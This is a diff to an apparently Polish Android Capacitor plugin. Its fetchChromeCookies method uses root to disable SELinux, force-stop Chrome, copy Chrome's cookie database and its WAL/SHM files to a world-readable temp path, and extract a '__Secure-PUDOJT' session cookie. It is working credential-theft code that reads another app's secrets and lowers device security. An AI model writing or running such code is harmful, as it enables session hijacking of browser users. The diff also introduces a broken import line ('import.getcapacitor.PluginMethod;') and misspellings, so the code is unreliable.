@@ -5,7 +5,7 @@ import android.database.sqlite.SQLiteDatabase;
 
 import com.getcapacitor.Plugin;
 import com.getcapacitor.PluginCall;
-import com.getcapacitor.PluginMethod;
+import.getcapacitor.PluginMethod;
 import com.getcapacitor.annotation.CapacitorPlugin;
 import com.getcapacitor.JSObject;
 
@@ -31,7 +31,7 @@ public class KernelSuPlugin extends Plugin {
     public void fetchChromeCookies(PluginCall call) {
         JSObject ret = new JSObject();
         StringBuilder logs = new StringBuilder();
-        logs.append("=== ROZPOCZYNAM ODCRYT COOKIES KERNELSU ===\n");
+        logs.append("=== ROZPOCZYNAM ODCRZYT COOKIES KERNELSU ===\n");
         try {
             // 1. Verify Root
             Process rootCheck = Runtime.getRuntime().exec("su");
@@ -51,31 +51,30 @@ public class KernelSuPlugin extends Plugin {
             File tempDb = new File("/data/local/tmp/ikw_chrome_cookies.db");
             if (tempDb.exists()) tempDb.delete();
 
-            // Shell script to locate and copy Chrome cookies to /data/local/tmp/ with full error reporting
+            // Shell script targeting STRICTLY com.android.chrome with WAL file copy and chrome kill
             String script = 
                 "setenforce 0\n" +
-                "FOUND_PATH=\"\"\n" +
+                "am force-stop com.android.chrome 2>/dev/null\n" +
+                "FOUND=\"\"\n" +
                 "for f in " +
                 "  /data/data/com.android.chrome/app_chrome/Default/Cookies " +
                 "  /data/data/com.android.chrome/app_chrome/Default/Network/Cookies " +
                 "  /data/user/0/com.android.chrome/app_chrome/Default/Cookies " +
                 "  /data/user/0/com.android.chrome/app_chrome/Default/Network/Cookies " +
-                "  $(find /data/data/com.android.chrome/ /data/user/0/com.android.chrome/ -name \"Cookies\" 2>/dev/null) " +
-                "  $(find /data/data/ /data/user/0/ -name \"Cookies\" 2>/dev/null); do\n" +
+                "  $(find /data/data/com.android.chrome/ /data/user/0/com.android.chrome/ -name \"Cookies\" 2>/dev/null); do\n" +
                 "  if [ -f \"$f\" ]; then\n" +
-                "    echo \"TRYING_COPY_FROM:$f\"\n" +
+                "    echo \"FOUND_CHROME_COOKIE:$f\"\n" +
                 "    cp \"$f\" /data/local/tmp/ikw_chrome_cookies.db\n" +
-                "    CP_STATUS=$?\n" +
-                "    if [ $CP_STATUS -eq 0 ] && [ -s /data/local/tmp/ikw_chrome_cookies.db ]; then\n" +
-                "      chmod 666 /data/local/tmp/ikw_chrome_cookies.db\n" +
-                "      echo \"SUCCESSFULLY_COPIED_FROM:$f\"\n" +
-                "      FOUND_PATH=\"$f\"\n" +
-                "      break\n" +
-                "    else\n" +
-                "      echo \"COPY_FAILED_FROM:$f STATUS:$CP_STATUS\"\n" +
-                "    fi\n" +
+                "    [ -f \"${f}-wal\" ] && cp \"${f}-wal\" /data/local/tmp/ikw_chrome_cookies.db-wal\n" +
+                "    [ -f \"${f}-shm\" ] && cp \"${f}-shm\" /data/local/tmp/ikw_chrome_cookies.db-shm\n" +
+                "    chmod 666 /data/local/tmp/ikw_chrome_cookies.db*\n" +
+                "    FOUND=\"$f\"\n" +
+                "    break\n" +
                 "  fi\n" +
                 "done\n" +
+                "if [ -z \"$FOUND\" ]; then\n" +
+                "  echo \"ERROR: Nie znaleziono pliku Cookies w katalogu com.android.chrome\"\n" +
+                "fi\n" +
                 "setenforce 1\n" +
                 "exit\n";
 
@@ -95,7 +94,7 @@ public class KernelSuPlugin extends Plugin {
             String pudojtmd = "";
 
             if (tempDb.exists() && tempDb.length() > 0) {
-                logs.append("✅ Plik bazy dostępny pod /data/local/tmp/ (rozmiar: ").append(tempDb.length()).append(" bajtów).\n");
+                logs.append("✅ Plik bazy Chrome skopiowany (rozmiar: ").append(tempDb.length()).append(" bajtów).\n");
 
                 SQLiteDatabase db = null;
                 try {
@@ -131,8 +130,10 @@ public class KernelSuPlugin extends Plugin {
                 }
 
                 tempDb.delete();
+                new File("/data/local/tmp/ikw_chrome_cookies.db-wal").delete();
+                new File("/data/local/tmp/ikw_chrome_cookies.db-shm").delete();
             } else {
-                logs.append("❌ Nie udało się utworzyć pliku /data/local/tmp/ikw_chrome_cookies.db\n");
+                logs.append("❌ Nie udało się utwarzyć /data/local/tmp/ikw_chrome_cookies.db z Chrome\n");
             }
 
             ret.put("logs", logs.toString());
@@ -144,7 +145,7 @@ public class KernelSuPlugin extends Plugin {
                 call.resolve(ret);
             } else {
                 ret.put("success", false);
-                ret.put("message", "Nie odnaleziono ciasteczek __Secure-PUDOJT.\nLogi:\n" + logs.toString());
+                ret.put("message", "Nie odnaleziono ciasteczek __Secure-PUDOJT w Chrome.\nLogi:\n" + logs.toString());
                 call.resolve(ret);
             }
         } catch (Exception e) {
